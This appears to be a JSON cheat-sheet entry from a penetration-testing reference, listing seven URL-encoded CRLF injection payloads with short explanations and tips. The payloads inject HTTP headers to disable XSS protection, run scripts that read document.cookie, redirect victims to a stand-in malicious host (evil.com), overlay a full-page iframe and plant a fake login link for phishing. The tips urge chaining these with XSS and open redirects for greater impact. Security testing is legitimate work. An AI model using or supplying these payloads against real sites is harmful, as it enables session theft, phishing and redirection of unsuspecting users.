{
    "id": "crlf-injection.json",
    "title": "CRLF Injection",
    "category": "Web Security",
    "commands": [
        {
            "cmd": "%0d%0a%0d%0a%3Ch1%3ECoffinxp%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E",
            "info": "Basic injection payload to test for CRLF vulnerabilities, adding extra headers or HTML."
        },
        {
            "cmd": "%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E",
            "info": "CRLF injection testing to bypass security headers like X-XSS-Protection and inject malicious scripts."
        },
        {
            "cmd": "%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E",
            "info": "Payload to redirect the victim to a malicious site using CRLF injection."
        },
        {
            "cmd": "%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a%0d%0a/%2f%2e%2e",
            "info": "Testing for script execution in SVG tags after CRLF injection and potential bypass techniques."
        },
        {
            "cmd": "%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E",
            "info": "Injecting an image tag with an onerror event to trigger a JavaScript prompt."
        },
        {
            "cmd": "%0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A",
            "info": "Using an iframe to embed external content and potentially trick users into interacting with a malicious frame."
        },
        {
            "cmd": "%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fwww.cia.gov%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A",
            "info": "Adding a crafted anchor tag to redirect users to a phishing page disguised as a legitimate link."
        }
    ],
    "tips": [
        "Always encode your payloads properly to prevent breaking the target's application.",
        "Use tools like Burp Suite to inject payloads into headers and parameters effectively.",
        "Test various headers and parameters for injection points, as not all inputs are sanitized the same way.",
        "Combine CRLF injection with other vulnerabilities (e.g., XSS, open redirect) for more impactful exploitation.",
        "Document all testing results carefully, noting which headers or inputs were vulnerable."
    ]
}
